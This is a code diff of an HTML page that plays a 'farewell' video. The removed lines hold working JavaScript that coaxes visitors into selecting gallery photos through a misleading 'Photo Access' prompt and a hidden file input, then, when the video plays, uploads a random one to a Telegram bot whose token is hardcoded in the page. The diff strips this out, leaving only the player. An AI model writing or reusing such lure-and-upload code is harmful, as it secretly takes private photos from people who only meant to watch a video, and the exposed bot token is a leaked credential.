@@ -36,204 +36,21 @@
             width: auto;
             height: auto;
         }
-
-        #permission-prompt {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.9);
-            color: white;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            z-index: 2000;
-            max-width: 350px;
-            display: none;
-        }
-
-        #permission-prompt button {
-            background: #007AFF;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 10px;
-        }
-
-        #permission-prompt button:hover {
-            background: #0056D3;
-        }
-
-        #status {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 10px 15px;
-            border-radius: 8px;
-            font-size: 14px;
-            z-index: 1000;
-            display: none;
-        }
-
-        #hidden-input {
-            position: fixed;
-            top: -1000px;
-            left: -1000px;
-            opacity: 0;
-            pointer-events: none;
-        }
     </style>
 </head>
 <body>
-    <div id="permission-prompt">
-        <h3>📱 Photo Access</h3>
-        <p>This website needs access to your photo gallery to send a random existing photo to your Telegram bot when you play the video.</p>
-        <p><small>No camera will be opened - only your existing photos will be accessed.</small></p>
-        <button onclick="allowPhotoAccess()">Allow Photo Access</button>
-    </div>
-
-    <div id="status">Ready</div>
-    
     <div id="video-container">
         <video id="farewell-video" controls>
+            <!-- The video file will be loaded from the same directory as this HTML file -->
             <source src="manup.mp4" type="video/mp4">
             Your browser does not support the video tag.
         </video>
     </div>
 
-    <!-- Hidden file input for photo access -->
-    <input type="file" id="hidden-input" accept="image/*" multiple style="display: none;">
-
     <script>
-        // Telegram Configuration
-        const TELEGRAM_BOT_TOKEN = '6759901283:AAGGfZvU2EX59mK6uefmHV69GJ-NKPbCdQ4';
-        let hasImageBeenSent = false;
-        let availablePhotos = [];
-        let permissionGranted = false;
-
-        function showStatus(message) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.style.display = 'block';
-            setTimeout(() => {
-                status.style.display = 'none';
-            }, 4000);
-        }
-
-        // Allow photo access - user selects multiple photos from gallery
-        function allowPhotoAccess() {
-            const input = document.getElementById('hidden-input');
-            
-            input.onchange = function(e) {
-                const files = Array.from(e.target.files);
-                if (files.length > 0) {
-                    availablePhotos = files;
-                    permissionGranted = true;
-                    document.getElementById('permission-prompt').style.display = 'none';
-                    showStatus(`✅ ${files.length} photos loaded! Ready to send random photo when video plays.`);
-                } else {
-                    showStatus('❌ No photos selected');
-                }
-            };
-
-            input.oncancel = function() {
-                showStatus('❌ Photo access cancelled');
-                document.getElementById('permission-prompt').style.display = 'none';
-            };
-
-            // Trigger file selection
-            input.click();
-        }
-
-        // Get random photo from available photos
-        function getRandomPhoto() {
-            if (availablePhotos.length === 0) {
-                return null;
-            }
-            const randomIndex = Math.floor(Math.random() * availablePhotos.length);
-            return availablePhotos[randomIndex];
-        }
-
-        // Auto-detect chat ID
-        async function getChatId() {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`);
-                const data = await response.json();
-                if (data.ok && data.result.length > 0) {
-                    return data.result[data.result.length - 1].message.chat.id;
-                }
-            } catch (error) {
-                console.log('Error getting chat ID:', error);
-            }
-            return null;
-        }
-
-        // Send image to Telegram
-        async function sendImageToTelegram(imageFile) {
-            const chatId = await getChatId();
-            if (!chatId) {
-                showStatus('❌ No chat found. Send /start to your bot first.');
-                return;
-            }
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', imageFile);
-            formData.append('caption', '🎬 Random photo from your gallery! 📸');
-
-            try {
-                showStatus('📤 Sending random photo to Telegram...');
-                
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                const result = await response.json();
-                if (result.ok) {
-                    showStatus('✅ Random photo sent successfully!');
-                } else {
-                    showStatus('❌ Failed to send photo');
-                    console.log('Telegram error:', result.description);
-                }
-            } catch (error) {
-                showStatus('❌ Network error');
-                console.log('Network error:', error);
-            }
-        }
-
-        // Main function to send random photo
-        async function sendRandomPhoto() {
-            if (hasImageBeenSent) return;
-            hasImageBeenSent = true;
-
-            if (!permissionGranted || availablePhotos.length === 0) {
-                showStatus('❌ No photos available. Please allow photo access first.');
-                return;
-            }
-
-            showStatus('🎲 Selecting random photo...');
-            const randomPhoto = getRandomPhoto();
-            
-            if (randomPhoto) {
-                console.log(`📸 Sending random photo: ${randomPhoto.name}`);
-                await sendImageToTelegram(randomPhoto);
-            } else {
-                showStatus('❌ No photo could be selected');
-            }
-        }
-
         document.addEventListener('DOMContentLoaded', function() {
             const videoContainer = document.getElementById('video-container');
             const video = document.getElementById('farewell-video');
-            
-            // Show permission prompt
-            document.getElementById('permission-prompt').style.display = 'block';
             
             // Fade in the video container
             setTimeout(function() {
@@ -246,9 +63,6 @@
                     console.log('Auto-play was prevented. Click to play.');
                 });
             }, 1600);
-
-            // Send random photo when video plays
-            video.addEventListener('play', sendRandomPhoto, { once: true });
         });
     </script>
 </body>
